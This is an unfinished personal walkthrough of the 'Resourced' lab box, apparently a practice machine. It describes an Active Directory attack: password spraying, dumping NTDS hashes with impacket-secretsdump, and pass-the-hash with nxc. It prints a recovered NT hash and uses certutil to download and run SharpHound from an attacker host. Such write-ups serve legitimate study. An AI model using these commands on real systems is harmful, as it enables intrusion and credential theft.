# Resourced

I start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

then i looked to map smb shares but without success and decided to try and look at usernames through RID bruteforcing and description enumeration and got a hit:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

So i add every username in a users.txt and see what rights i have with this new ste of credentials:

Just to be sure that the password is only valid for ventz i spray it:

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

While mapping shares i can see a password audit folder that seems interesting:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

So i download everything in those shares:

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

and we got some interesting files:

<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

then i google some commands and see this:

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets" %}

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption><p>impacket-secretsdump -security SECURITY -system SYSTEM LOCAL</p></figcaption></figure>

and this that seemed just a bit more interesting:

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" %}

```
impacket-secretsdump -ntds ../Active\ Directory/ntds.dit -system SYSTEM LOCAL
```

This dumped a lot more:

<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

So i take all of the NT hashes from this ouput and try pass the hash on our username list&#x20;

```
nxc smb 192.168.51.175 -u users.txt  -H hashes --shares
```

and it works so i try to see if i have winrm rights&#x20;

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption><p>L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

Will come back later, forgot i had a job my bad gang

I installed sharphound on the target and launch it:

```
certutil -f -urlcache http://192.168.49.56:9090/SharpHound.exe Sharp.exe
. ./Sharp.exe
```

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

Bloodhound can't be installed on the vm bruh

